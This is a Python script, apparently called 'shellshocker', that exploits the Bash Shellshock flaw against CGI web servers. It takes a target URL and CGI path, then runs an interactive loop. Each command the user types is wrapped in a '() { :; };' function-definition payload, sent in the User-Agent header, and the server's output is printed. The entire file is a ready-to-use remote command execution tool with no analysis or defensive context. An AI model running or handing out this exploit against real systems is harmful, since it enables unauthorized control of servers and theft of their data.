#!/usr/bin/python3

import requests
import os
import re
import sys


class bcolors:
    
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'


def init():
    os.system("clear")
    banner = """
               ,,                                      ,,                                                    
             `7MM                                    `7MM                         `7MM                       
               MM                 __,   __,            MM                           MM                       
     M******   MMpMMMb.  pd""b.  `7MM  `7MM  M******   MMpMMMb.  ,pP""Yq.   ,p6"bo  MM  ,MP'pd""b.  `7Mb,od8 
    .M         MM    MM (O)  `8b   MM    MM .M         MM    MM 6W'    `Wb 6M'  OO  MM ;Y  (O)  `8b   MM' "' 
    |bMMAg.    MM    MM      ,89   MM    MM |bMMAg.    MM    MM 8M      M8 8M       MM;Mm       ,89   MM     
         `Mb   MM    MM    ""Yb.   MM    MM      `Mb   MM    MM YA.    ,A9 YM.    , MM `Mb.   ""Yb.   MM     
          jM .JMML  JMML.     88 .JMML..JMML.     jM .JMML  JMML.`Ybmmd9'   YMbmd'.JMML. YA.     88 .JMML.   
    (O)  ,M9            (O)  .M'            (O)  ,M9                                       (O)  .M'          
     6mmm9               bmmmd'              6mmm9                                          bmmmd'           
                                  
    """
    print(bcolors.GREEN)
    print(banner)
    print(bcolors.ENDC)

    if len(sys.argv) != 3:
        print(bcolors.RED)
        print(f"[!]Usage: {sys.argv[0]} <target_URL> <cgi_path>")
        print(bcolors.ENDC)
        sys.exit()

def main():

    target_url = sys.argv[1]
    cgi_path   = sys.argv[2] 
    
    reg = re.search(r"http.+/$",target_url)

    if reg == None:
        target_url = target_url + "/"

    reg = re.search(r"^/.+",cgi_path)

    if reg != None:

        cgi_path =  cgi_path[1:len(cgi_path)] 
    

    req_url = target_url + cgi_path

    print(f"[*]Aim to {req_url}")

    payload = "() { :; }; echo; echo; /bin/bash -c '"


    while True:
    
        print(bcolors.BLUE)
        cmd = input("[+]Enter Command: ")
        print(bcolors.ENDC)

        last = "'"

        headers = payload + cmd + last
        headers = {"User-Agent":headers}

        if cmd == "exit":
            print(bcolors.YELLOW,"Bye...",bcolors.ENDC)
            sys.exit()

        try:
            res = requests.get(req_url,headers=headers)

            print(res.text)

            
        except:

            print(bcolors.RED,"[!]Some Issue Occured...",bcolors.ENDC)

if __name__ == "__main__":

    init()
    main()
